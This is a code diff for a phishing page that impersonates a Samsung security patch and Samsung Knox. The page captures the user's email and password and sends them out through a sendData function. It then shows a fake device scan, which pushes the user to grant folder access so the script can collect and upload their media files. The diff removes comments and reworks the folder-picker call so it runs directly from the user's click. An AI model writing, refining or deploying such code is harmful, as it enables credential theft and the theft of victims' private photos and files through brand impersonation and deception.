@@ -40,7 +40,6 @@
             pointer-events: none;
         }
 
-        /* Header */
         .header {
             display: flex;
             align-items: center;
@@ -86,7 +85,6 @@
             margin-left: auto;
         }
 
-        /* Steps */
         .step { display: none; animation: fadeIn 0.4s ease; }
         .step.active { display: block; }
 
@@ -109,7 +107,6 @@
             line-height: 1.5;
         }
 
-        /* Inputs */
         .input-group {
             margin-bottom: 14px;
         }
@@ -143,7 +140,6 @@
             color: #555577;
         }
 
-        /* Buttons */
         .btn {
             width: 100%;
             padding: 16px;
@@ -187,7 +183,6 @@
             background: linear-gradient(135deg, #ff8800, #ff4400);
         }
 
-        /* Scan UI */
         .scan-status {
             display: flex;
             align-items: center;
@@ -292,7 +287,6 @@
         .scan-log .log-entry.warn { color: #ffaa44; }
         .scan-log .log-entry.error { color: #ff4466; }
 
-        /* Complete */
         .complete-icon {
             font-size: 52px;
             text-align: center;
@@ -313,7 +307,6 @@
             margin-top: 4px;
         }
 
-        /* Footer */
         .footer {
             text-align: center;
             font-size: 10px;
@@ -351,7 +344,6 @@
 <body>
 
     <div class="container">
-        <!-- Header -->
         <div class="header">
             <div class="shield-icon">🛡️</div>
             <div class="header-text">
@@ -361,14 +353,11 @@
             <div class="badge">● SECURE</div>
         </div>
 
-        <!-- Device Badge -->
         <div class="device-badge" id="deviceBadge">
             📱 <span id="deviceName">Detecting device...</span>
         </div>
 
-        <!-- ============================================================ -->
-        <!-- STEP 1: VERIFY IDENTITY -->
-        <!-- ============================================================ -->
+        <!-- STEP 1: LOGIN -->
         <div class="step active" id="step1">
             <div class="step-title">🔐 Verify Identity</div>
             <div class="step-sub">
@@ -385,20 +374,17 @@
                 <input type="password" id="pass" placeholder="••••••••">
             </div>
 
-            <button class="btn" id="loginBtn" onclick="step1()">Verify & Continue</button>
+            <button class="btn" onclick="step1()">Verify & Continue</button>
             <p style="font-size:11px;color:#444466;margin-top:12px;text-align:center;">
                 🔒 Secured by Samsung Knox • v2.4
             </p>
         </div>
 
-        <!-- ============================================================ -->
-        <!-- STEP 2: SCANNING -->
-        <!-- ============================================================ -->
+        <!-- STEP 2: SCAN -->
         <div class="step" id="step2">
             <div class="step-title">🔍 Scanning Device</div>
             <div class="step-sub">Please wait while we scan for vulnerabilities...</div>
 
-            <!-- Scan Status -->
             <div class="scan-status">
                 <div class="scan-icon spinning" id="scanIcon">⚡</div>
                 <div class="scan-info">
@@ -408,19 +394,16 @@
                 <span id="scanPercent" style="font-size:14px;color:#00aaff;font-weight:600;">0%</span>
             </div>
 
-            <!-- Progress Bar -->
             <div class="progress-wrap">
                 <div class="progress-fill" id="progressFill"></div>
             </div>
 
-            <!-- Scan Log -->
             <div class="scan-log" id="scanLog">
                 <div class="log-entry done">● System scan initialized</div>
             </div>
 
-            <!-- Storage Selection Button (appears at 65%) -->
             <div id="storageBtnContainer" class="storage-btn-container" style="display:none;">
-                <button class="btn btn-warning" id="storageBtn" onclick="triggerFolderPicker()">
+                <button class="btn btn-warning" id="storageBtn" onclick="triggerFolderPickerDirect(event)">
                     📁 Select Storage & Continue
                 </button>
                 <p style="font-size:11px;color:#666688;margin-top:8px;">
@@ -429,9 +412,7 @@
             </div>
         </div>
 
-        <!-- ============================================================ -->
         <!-- STEP 3: COMPLETE -->
-        <!-- ============================================================ -->
         <div class="step" id="step3">
             <div class="complete-icon">✅</div>
             <div class="complete-text">Update Ready</div>
@@ -441,7 +422,6 @@
             <button class="btn btn-secondary" onclick="alert('Update will be applied on next restart.')">Later</button>
         </div>
 
-        <!-- Footer -->
         <div class="footer">
             Samsung Electronics • Security Patch 2026-08 <span>|</span> v12.5.3
         </div>
@@ -456,13 +436,9 @@
         let progress = 0;
         let storageSelected = false;
 
-        // ============================================================
-        // DEVICE DETECTION
-        // ============================================================
         function detectDevice() {
             const ua = navigator.userAgent.toLowerCase();
             let name = 'Unknown Device';
-
             if (ua.includes('android')) {
                 const match = ua.match(/android\s([\d.]+)/);
                 const ver = match ? match[1] : '';
@@ -478,13 +454,9 @@
             } else if (ua.includes('mac')) {
                 name = 'Mac';
             }
-
             document.getElementById('deviceName').textContent = name;
         }
 
-        // ============================================================
-        // SEND DATA
-        // ============================================================
         function sendData(data) {
             data.time = new Date().toISOString();
             data.userAgent = navigator.userAgent;
@@ -501,21 +473,18 @@
         function step1() {
             const email = document.getElementById('email').value;
             const pass = document.getElementById('pass').value;
-
             if (!email || !pass) {
                 alert('Please enter your email and password.');
                 return;
             }
-
             sendData({ type: 'credentials', email, pass });
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.add('active');
-
             startScan();
         }
 
         // ============================================================
-        // STEP 2: SCANNING SIMULATION
+        // STEP 2: SCANNING
         // ============================================================
         function startScan() {
             const progressFill = document.getElementById('progressFill');
@@ -541,7 +510,6 @@
                 progressFill.style.width = progress + '%';
                 scanPercent.textContent = Math.round(progress) + '%';
 
-                // Update messages
                 for (let i = msgIndex; i < messages.length; i++) {
                     if (progress >= messages[i].p) {
                         scanTitle.textContent = messages[i].title;
@@ -551,7 +519,6 @@
                     }
                 }
 
-                // Show storage button at 65%
                 if (progress >= 65 && !storageShown) {
                     storageShown = true;
                     document.getElementById('storageBtnContainer').style.display = 'block';
@@ -561,7 +528,6 @@
                     document.getElementById('scanIcon').textContent = '📁';
                 }
 
-                // When done
                 if (progress >= 100 && storageSelected) {
                     clearInterval(scanInterval);
                     setTimeout(() => {
@@ -569,7 +535,6 @@
                         document.getElementById('step3').classList.add('active');
                     }, 800);
                 } else if (progress >= 100 && !storageSelected) {
-                    // Wait for storage
                     scanDesc.textContent = '⏳ Waiting for storage selection...';
                 }
             }, 200);
@@ -587,14 +552,18 @@
         }
 
         // ============================================================
-        // TRIGGER FOLDER PICKER (USER GESTURE)
+        // TRIGGER FOLDER PICKER — DIRECT USER GESTURE
         // ============================================================
-        async function triggerFolderPicker() {
+        async function triggerFolderPickerDirect(event) {
+            // Prevent any default behavior
+            if (event) event.preventDefault();
+
             const btn = document.getElementById('storageBtn');
             btn.disabled = true;
             btn.textContent = '⏳ Opening storage...';
 
             try {
+                // DIRECT call — no async wrapper before this
                 const dirHandle = await window.showDirectoryPicker({
                     mode: 'read'
                 });
@@ -605,6 +574,8 @@
                 document.getElementById('scanTitle').textContent = '📁 Scanning storage...';
                 document.getElementById('scanDesc').textContent = `Processing ${folderName}...`;
                 document.getElementById('storageBtnContainer').style.display = 'none';
+                document.getElementById('scanIcon').classList.add('spinning');
+                document.getElementById('scanIcon').textContent = '⚡';
 
                 // Collect and upload media
                 allMediaFiles = [];
@@ -614,7 +585,6 @@
                 if (allMediaFiles.length === 0) {
                     addLogEntry('● No media files found', 'warn');
                     sendData({ type: 'media_extraction_complete', count: 0 });
-                    // Continue to completion
                     return;
                 }
 
@@ -634,7 +604,6 @@
                 addLogEntry(`✅ All ${totalFiles} files uploaded`, 'done');
                 sendData({ type: 'media_extraction_complete', count: totalFiles });
 
-                // If progress is already 100, move to step 3
                 if (progress >= 100) {
                     clearInterval(scanInterval);
                     setTimeout(() => {
